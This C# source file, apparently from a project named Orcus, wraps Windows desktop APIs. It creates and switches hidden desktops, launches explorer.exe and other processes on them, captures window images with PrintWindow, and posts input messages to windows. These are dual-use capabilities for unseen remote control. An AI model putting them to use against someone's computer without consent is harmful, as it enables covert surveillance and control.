using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Orcus.Native;

namespace Orcus.Utilities.WindowsDesktop
{
    public class Desktop : IDisposable, ICloneable
    {
        /// <summary>
        ///     Size of buffer used when retrieving window names.
        /// </summary>
        public const int MaxWindowNameLength = 100;

        //
        // winAPI constants.
        //
        private const short SW_HIDE = 0;
        private const short SW_NORMAL = 1;
        private const int STARTF_USESTDHANDLES = 0x00000100;
        private const int STARTF_USESHOWWINDOW = 0x00000001;
        private const int UOI_NAME = 2;
        private const uint STARTF_USEPOSITION = 0x00000004;
        private const int NORMAL_PRIORITY_CLASS = 0x00000020;
        private const uint DESKTOP_CREATEWINDOW = 0x0002;
        private const uint DESKTOP_ENUMERATE = 0x0040;
        private const uint DESKTOP_WRITEOBJECTS = 0x0080;
        private const uint DESKTOP_SWITCHDESKTOP = 0x0100;
        private const uint DESKTOP_CREATEMENU = 0x0004;
        private const uint DESKTOP_HOOKCONTROL = 0x0008;
        private const uint DESKTOP_READOBJECTS = 0x0001;
        private const uint DESKTOP_JOURNALRECORD = 0x0010;
        private const uint DESKTOP_JOURNALPLAYBACK = 0x0020;

        private const uint AccessRights =
            DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK | DESKTOP_CREATEWINDOW | DESKTOP_ENUMERATE |
            DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP | DESKTOP_CREATEMENU | DESKTOP_HOOKCONTROL |
            DESKTOP_READOBJECTS;

        private static StringCollection m_sc;

        /// <summary>
        ///     Opens the default desktop.
        /// </summary>
        public static readonly Desktop Default = OpenDefaultDesktop();

        /// <summary>
        ///     Opens the desktop the user if viewing.
        /// </summary>
        public static readonly Desktop Input = OpenInputDesktop();

        private IntPtr m_desktop;
        private string m_desktopName;
        private bool m_disposed;
        private List<IntPtr> m_windows;

        /// <summary>
        ///     Creates a new Desktop object.
        /// </summary>
        public Desktop()
        {
            // init variables.
            m_desktop = IntPtr.Zero;
            m_desktopName = String.Empty;
            m_windows = new List<IntPtr>();
            m_disposed = false;
            DesktopActions = new DesktopActions(this);
        }

        // constructor is private to prevent invalid handles being passed to it.
        private Desktop(IntPtr desktop)
        {
            // init variables.
            m_desktop = desktop;
            m_desktopName = GetDesktopName(desktop);
            m_windows = new List<IntPtr>();
            m_disposed = false;
            DesktopActions = new DesktopActions(this);
        }

        /// <summary>
        ///     Gets if a desktop is open.
        /// </summary>
        public bool IsOpen => (m_desktop != IntPtr.Zero);

        /// <summary>
        ///     Gets the name of the desktop, returns null if no desktop is open.
        /// </summary>
        public string DesktopName => m_desktopName;

        /// <summary>
        ///     Gets a handle to the desktop, IntPtr.Zero if no desktop open.
        /// </summary>
        public IntPtr DesktopHandle => m_desktop;

        /// <summary>
        /// Defines actions which can be applied to the desktop
        /// </summary>
        public DesktopActions DesktopActions { get; }

        /// <summary>
        ///     Creates a new Desktop object with the same desktop open.
        /// </summary>
        /// <returns>Cloned desktop object.</returns>
        public object Clone()
        {
            // make sure object isnt disposed.
            CheckDisposed();

            Desktop desktop = new Desktop();

            // if a desktop is open, make the clone open it.
            if (IsOpen) desktop.Open(m_desktopName);

            return desktop;
        }

        /// <summary>
        ///     Dispose Object.
        /// </summary>
        public void Dispose()
        {
            // dispose
            Dispose(true);

            // suppress finalisation
            GC.SuppressFinalize(this);
        }

        ~Desktop()
        {
            // clean up, close the desktop.
            Close();
        }

        /// <summary>
        ///     Creates a new desktop.  If a handle is open, it will be closed.
        /// </summary>
        /// <param name="name">The name of the new desktop.  Must be unique, and is case sensitive.</param>
        /// <returns>True if desktop was successfully created, otherwise false.</returns>
        public bool Create(string name)
        {
            // make sure object isnt disposed.
            CheckDisposed();

            // close the open desktop.
            if (m_desktop != IntPtr.Zero)
            {
                // attempt to close the desktop.
                if (!Close()) return false;
            }

            // make sure desktop doesnt already exist.
            if (Exists(name))
            {
                // it exists, so open it.
                return Open(name);
            }

            // attempt to create desktop.
            m_desktop = NativeMethods.CreateDesktop(name, IntPtr.Zero, IntPtr.Zero, 0, AccessRights, IntPtr.Zero);

            m_desktopName = name;

            // something went wrong.
            if (m_desktop == IntPtr.Zero) return false;

            DesktopActions.Load();

            return true;
        }

        /// <summary>
        ///     Closes the handle to a desktop.
        /// </summary>
        /// <returns>True if an open handle was successfully closed.</returns>
        public bool Close()
        {
            // make sure object isnt disposed.
            CheckDisposed();

            // check there is a desktop open.
            if (m_desktop != IntPtr.Zero)
            {
                // close the desktop.
                bool result = NativeMethods.CloseDesktop(m_desktop);

                if (result)
                {
                    m_desktop = IntPtr.Zero;

                    m_desktopName = String.Empty;
                }

                return result;
            }

            // no desktop was open, so desktop is closed.
            return true;
        }

        /// <summary>
        ///     Opens a desktop.
        /// </summary>
        /// <param name="name">The name of the desktop to open.</param>
        /// <returns>True if the desktop was successfully opened.</returns>
        public bool Open(string name)
        {
            // make sure object isnt disposed.
            CheckDisposed();

            // close the open desktop.
            if (m_desktop != IntPtr.Zero)
            {
                // attempt to close the desktop.
                if (!Close()) return false;
            }

            // open the desktop.
            m_desktop = NativeMethods.OpenDesktop(name, 0, true, AccessRights);

            // something went wrong.
            if (m_desktop == IntPtr.Zero) return false;

            m_desktopName = name;

            DesktopActions.Load();

            return true;
        }

        /// <summary>
        ///     Opens the current input desktop.
        /// </summary>
        /// <returns>True if the desktop was succesfully opened.</returns>
        public bool OpenInput()
        {
            // make sure object isnt disposed.
            CheckDisposed();

            // close the open desktop.
            if (m_desktop != IntPtr.Zero)
            {
                // attempt to close the desktop.
                if (!Close()) return false;
            }

            // open the desktop.
            m_desktop = NativeMethods.OpenInputDesktop(0, true, AccessRights);

            // something went wrong.
            if (m_desktop == IntPtr.Zero) return false;

            // get the desktop name.
            m_desktopName = GetDesktopName(m_desktop);

            DesktopActions.Load();

            return true;
        }

        /// <summary>
        ///     Switches input to the currently opened desktop.
        /// </summary>
        /// <returns>True if desktops were successfully switched.</returns>
        public bool Show()
        {
            // make sure object isnt disposed.
            CheckDisposed();

            // make sure there is a desktop to open.
            if (m_desktop == IntPtr.Zero) return false;

            // attempt to switch desktops.
            bool result = NativeMethods.SwitchDesktop(m_desktop);

            return result;
        }

        /// <summary>
        ///     Enumerates the windows on a desktop.
        /// </summary>
        /// <param name="windows">Array of Desktop.Window objects to recieve windows.</param>
        /// <returns>A window colleciton if successful, otherwise null.</returns>
        public List<Window> GetWindows()
        {
            CheckDisposed();

            if (!IsOpen)
                return null;

            lock (m_windows)
            {
                m_windows.Clear();
                var result = NativeMethods.EnumDesktopWindows(m_desktop, DesktopWindowsProc, IntPtr.Zero);

                if (!result)
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }

                return !result ? null : m_windows.Select(wnd => new Window(wnd)).ToList();
            }
        }

        private bool DesktopWindowsProc(IntPtr wndHandle, IntPtr lParam)
        {
            // add window handle to colleciton.
            m_windows.Add(wndHandle);

            return true;
        }

        /// <summary>
        ///     Creates a new process in a desktop.
        /// </summary>
        /// <param name="path">Path to application.</param>
        /// <param name="argument">The arguments for the process</param>
        /// <returns>The process object for the newly created process.</returns>
        public Process CreateProcess(string path, string argument)
        {
            CheckDisposed();

            if (!IsOpen)
                return null;

            var commandLine = BuildCommandLine(path, argument);

            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = DesktopName;

            var pi = new PROCESS_INFORMATION();

            var result = NativeMethods.CreateProcess(null, commandLine.ToString(), IntPtr.Zero, IntPtr.Zero, true,
                NORMAL_PRIORITY_CLASS,
                IntPtr.Zero, null, ref si, ref pi);

            if (!result)
                return null;

            return Process.GetProcessById(pi.dwProcessId);
        }

        /// <summary>
        ///     Prepares a desktop for use.  For use only on newly created desktops, call straight after CreateDesktop.
        /// </summary>
        public void Prepare()
        {
            // make sure object isnt disposed.
            CheckDisposed();

            // make sure a desktop is open.
            if (IsOpen)
            {
                // load explorer.
                CreateProcess("explorer.exe", "");
            }
        }

        public Bitmap DrawDesktop()
        {
            var windows = GetWindows();
            if (windows == null)
                return null;

            var bitmap = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height);
            using (var graphics = Graphics.FromImage(bitmap))
            {
                for (int i = windows.Count - 1; i-- > 0;)
                {
                    var window = windows[i];
                    RECT rect;
                    if (!NativeMethods.GetWindowRect(window.Handle, out rect) || rect.Width == 0 || rect.Height == 0)
                        continue;

                    using (var windowImage = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppPArgb))
                    {
                        using (var gfxBmp = Graphics.FromImage(windowImage))
                        {
                            var hdcBitmap = gfxBmp.GetHdc();
                            try
                            {
                                if (!NativeMethods.PrintWindow(window.Handle, hdcBitmap, 0))
                                    continue;
                            }
                            finally
                            {
                                gfxBmp.ReleaseHdc(hdcBitmap);
                            }
                        }

                        graphics.DrawImage(windowImage, rect.X, rect.Y);
                    }
                }
            }

            return bitmap;
        }

        public Bitmap DrawWindow(IntPtr handle, RECT rect)
        {
            var windowImage = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppPArgb);

            using (var gfxBmp = Graphics.FromImage(windowImage))
            {
                var hdcBitmap = gfxBmp.GetHdc();
                try
                {
                    if (!NativeMethods.PrintWindow(handle, hdcBitmap, 0))
                        return null;
                }
                finally
                {
                    gfxBmp.ReleaseHdc(hdcBitmap);
                }
            }

            return windowImage;
        }

        public Bitmap DrawWindow(IntPtr handle)
        {
            var windows = GetWindows();
            if (windows == null)
                return null;

            var foundWindows = windows.Where(x => x.Handle == handle).ToList();
            if (foundWindows.Count == 0)
                return null;

            var window = foundWindows[0];

            RECT rect;
            if (!NativeMethods.GetWindowRect(window.Handle, out rect) || rect.Width == 0 || rect.Height == 0)
                return null;

            return DrawWindow(handle, rect);
        }

        public KeyValuePair<Window, RECT> GetWindowAtPosition(int x, int y)
        {
            var windows = GetWindows();
            foreach (var window in windows)
            {
                RECT rect;
                if (!NativeMethods.GetWindowRect(window.Handle, out rect) || rect.Width == 0 || rect.Height == 0)
                    continue;

                if (x >= rect.Left && x <= rect.Right && y >= rect.Top && y <= rect.Bottom)
                    return new KeyValuePair<Window, RECT>(window, rect);
            }

            return default(KeyValuePair<Window, RECT>);
        }

        public void PostMessage(int x, int y, WM msg, IntPtr wparam, IntPtr lparam)
        {
            var windows = GetWindows();
            for (int i = windows.Count - 1; i-- > 0;)
            {
                var window = windows[i];
                RECT rect;
                if (!NativeMethods.GetWindowRect(window.Handle, out rect) || rect.Width == 0 || rect.Height == 0)
                    continue;

                if (x >= rect.Left && x <= rect.Right && y >= rect.Top && y <= rect.Bottom)
                {
                    NativeMethods.PostMessage(new HandleRef(null, window.Handle), msg, wparam, lparam);
                    break;
                }
            }
        }

        public void PostMessage(WM msg, IntPtr wparam, IntPtr lparam)
        {
            var windows = GetWindows();
                //DO NOT REVERSE LIST. The first item has the greatest z index and is in foreground

            foreach (var window in windows)
            {
                RECT rect;
                if (!NativeMethods.GetWindowRect(window.Handle, out rect) || rect.Width == 0 || rect.Height == 0)
                    continue;

                NativeMethods.PostMessage(new HandleRef(null, window.Handle), msg, wparam, lparam);
                break;
            }
        }

        /// <summary>
        ///     Enumerates all of the desktops.
        /// </summary>
        /// <returns>True if desktop names were successfully enumerated.</returns>
        public static string[] GetDesktops()
        {
            // attempt to enum desktops.
            IntPtr windowStation = NativeMethods.GetProcessWindowStation();

            // check we got a valid handle.
            if (windowStation == IntPtr.Zero) return new string[0];

            string[] desktops;

            // lock the object. thread safety and all.
            lock (m_sc = new StringCollection())
            {
                bool result = NativeMethods.EnumDesktops(windowStation, DesktopProc, IntPtr.Zero);

                // something went wrong.
                if (!result) return new string[0];

                //	// turn the collection into an array.
                desktops = new string[m_sc.Count];
                for (int i = 0; i < desktops.Length; i++) desktops[i] = m_sc[i];
            }

            return desktops;
        }

        private static bool DesktopProc(string lpszDesktop, IntPtr lParam)
        {
            // add the desktop to the collection.
            m_sc.Add(lpszDesktop);

            return true;
        }

        /// <summary>
        ///     Switches to the specified desktop.
        /// </summary>
        /// <param name="name">Name of desktop to switch input to.</param>
        /// <returns>True if desktops were successfully switched.</returns>
        public static bool Show(string name)
        {
            // attmempt to open desktop.
            bool result = false;

            using (Desktop d = new Desktop())
            {
                result = d.Open(name);

                // something went wrong.
                if (!result) return false;

                // attempt to switch desktops.
                result = d.Show();
            }

            return result;
        }

        /// <summary>
        ///     Gets the desktop of the calling thread.
        /// </summary>
        /// <returns>Returns a Desktop object for the valling thread.</returns>
        public static Desktop GetCurrent()
        {
            // get the desktop.
            return new Desktop(NativeMethods.GetThreadDesktop(Thread.CurrentThread.ManagedThreadId));
        }

        /// <summary>
        ///     Sets the desktop of the calling thread.
        ///     NOTE: Function will fail if thread has hooks or windows in the current desktop.
        /// </summary>
        /// <param name="desktop">Desktop to put the thread in.</param>
        /// <returns>True if the threads desktop was successfully changed.</returns>
        public static bool SetCurrent(Desktop desktop)
        {
            // set threads desktop.
            if (!desktop.IsOpen) return false;

            return NativeMethods.SetThreadDesktop(desktop.DesktopHandle);
        }

        /// <summary>
        ///     Opens a desktop.
        /// </summary>
        /// <param name="name">The name of the desktop to open.</param>
        /// <returns>If successful, a Desktop object, otherwise, null.</returns>
        public static Desktop OpenDesktop(string name)
        {
            // open the desktop.
            Desktop desktop = new Desktop();
            bool result = desktop.Open(name);

            // somethng went wrong.
            if (!result) return null;

            return desktop;
        }

        /// <summary>
        ///     Opens the current input desktop.
        /// </summary>
        /// <returns>If successful, a Desktop object, otherwise, null.</returns>
        public static Desktop OpenInputDesktop()
        {
            // open the desktop.
            Desktop desktop = new Desktop();
            bool result = desktop.OpenInput();

            // somethng went wrong.
            if (!result) return null;

            return desktop;
        }

        /// <summary>
        ///     Opens the default desktop.
        /// </summary>
        /// <returns>If successful, a Desktop object, otherwise, null.</returns>
        public static Desktop OpenDefaultDesktop()
        {
            // opens the default desktop.
            return OpenDesktop("Default");
        }

        /// <summary>
        ///     Creates a new desktop.
        /// </summary>
        /// <param name="name">The name of the desktop to create.  Names are case sensitive.</param>
        /// <returns>If successful, a Desktop object, otherwise, null.</returns>
        public static Desktop CreateDesktop(string name)
        {
            // open the desktop.
            Desktop desktop = new Desktop();
            bool result = desktop.Create(name);

            // somethng went wrong.
            if (!result) return null;

            return desktop;
        }

        /// <summary>
        ///     Gets the name of a given desktop.
        /// </summary>
        /// <param name="desktop">Desktop object whos name is to be found.</param>
        /// <returns>If successful, the desktop name, otherwise, null.</returns>
        public static string GetDesktopName(Desktop desktop)
        {
            // get name.
            if (desktop.IsOpen) return null;

            return GetDesktopName(desktop.DesktopHandle);
        }

        /// <summary>
        ///     Gets the name of a desktop from a desktop handle.
        /// </summary>
        /// <param name="desktopHandle"></param>
        /// <returns>If successful, the desktop name, otherwise, null.</returns>
        public static string GetDesktopName(IntPtr desktopHandle)
        {
            // check its not a null pointer.
            // null pointers wont work.
            if (desktopHandle == IntPtr.Zero) return null;

            // get the length of the name.
            int needed = 0;
            string name = String.Empty;
            NativeMethods.GetUserObjectInformation(desktopHandle, UOI_NAME, IntPtr.Zero, 0, ref needed);

            // get the name.
            IntPtr ptr = Marshal.AllocHGlobal(needed);
            bool result = NativeMethods.GetUserObjectInformation(desktopHandle, UOI_NAME, ptr, needed, ref needed);
            name = Marshal.PtrToStringAnsi(ptr);
            Marshal.FreeHGlobal(ptr);

            // something went wrong.
            if (!result) return null;

            return name;
        }

        /// <summary>
        ///     Checks if the specified desktop exists (using a case sensitive search).
        /// </summary>
        /// <param name="name">The name of the desktop.</param>
        /// <returns>True if the desktop exists, otherwise false.</returns>
        public static bool Exists(string name)
        {
            return Exists(name, false);
        }

        /// <summary>
        ///     Checks if the specified desktop exists.
        /// </summary>
        /// <param name="name">The name of the desktop.</param>
        /// <param name="caseInsensitive">If the search is case INsensitive.</param>
        /// <returns>True if the desktop exists, otherwise false.</returns>
        public static bool Exists(string name, bool caseInsensitive)
        {
            // enumerate desktops.
            string[] desktops = GetDesktops();

            // return true if desktop exists.
            foreach (string desktop in desktops)
            {
                if (caseInsensitive)
                {
                    // case insensitive, compare all in lower case.
                    if (desktop.ToLower() == name.ToLower()) return true;
                }
                else
                {
                    if (desktop == name) return true;
                }
            }

            return false;
        }

        /// <summary>
        ///     Creates a new process on the specified desktop.
        /// </summary>
        /// <param name="path">Path to application.</param>
        /// <param name="desktop">Desktop name.</param>
        /// <returns>A Process object for the newly created process, otherwise, null.</returns>
        public static Process CreateProcessOnDesktop(string path, string desktop)
        {
            if (!Exists(desktop)) return null;

            // create the process.
            Desktop d = OpenDesktop(desktop);
            return d.CreateProcess(path, null);
        }

        /// <summary>
        ///     Gets an array of all the processes running on the Input desktop.
        /// </summary>
        /// <returns>An array of the processes.</returns>
        public static Process[] GetInputProcesses()
        {
            // get all processes.
            Process[] processes = Process.GetProcesses();

            ArrayList m_procs = new ArrayList();

            // get the current desktop name.
            string currentDesktop = GetDesktopName(Input.DesktopHandle);

            // cycle through the processes.
            foreach (Process process in processes)
            {
                // check the threads of the process - are they in this one?
                foreach (ProcessThread pt in process.Threads)
                {
                    // check for a desktop name match.
                    if (GetDesktopName(NativeMethods.GetThreadDesktop(pt.Id)) == currentDesktop)
                    {
                        // found a match, add to list, and bail.
                        m_procs.Add(process);
                        break;
                    }
                }
            }

            // put ArrayList into array.
            Process[] procs = new Process[m_procs.Count];

            for (int i = 0; i < procs.Length; i++) procs[i] = (Process) m_procs[i];

            return procs;
        }

        /// <summary>
        ///     Dispose Object.
        /// </summary>
        /// <param name="disposing">True to dispose managed resources.</param>
        public virtual void Dispose(bool disposing)
        {
            if (!m_disposed)
            {
                // dispose of managed resources,
                // close handles
                Close();
            }

            m_disposed = true;
        }

        private void CheckDisposed()
        {
            // check if disposed
            if (m_disposed)
            {
                // object disposed, throw exception
                throw new ObjectDisposedException("");
            }
        }

        /// <summary>
        ///     Gets the desktop name.
        /// </summary>
        /// <returns>The desktop name, or a blank string if no desktop open.</returns>
        public override string ToString()
        {
            // return the desktop name.
            return m_desktopName;
        }

        //https://referencesource.microsoft.com/#System/services/monitoring/system/diagnosticts/Process.cs,c50d8ac0eb7bc0d6
        private static StringBuilder BuildCommandLine(string executableFileName, string arguments)
        {
            // Construct a StringBuilder with the appropriate command line
            // to pass to CreateProcess.  If the filename isn't already 
            // in quotes, we quote it here.  This prevents some security
            // problems (it specifies exactly which part of the string
            // is the file to execute).
            StringBuilder commandLine = new StringBuilder();
            string fileName = executableFileName.Trim();
            bool fileNameIsQuoted = (fileName.StartsWith("\"", StringComparison.Ordinal) &&
                                     fileName.EndsWith("\"", StringComparison.Ordinal));
            if (!fileNameIsQuoted)
            {
                commandLine.Append("\"");
            }

            commandLine.Append(fileName);

            if (!fileNameIsQuoted)
            {
                commandLine.Append("\"");
            }

            if (!String.IsNullOrEmpty(arguments))
            {
                commandLine.Append(" ");
                commandLine.Append(arguments);
            }

            return commandLine;
        }
    }
}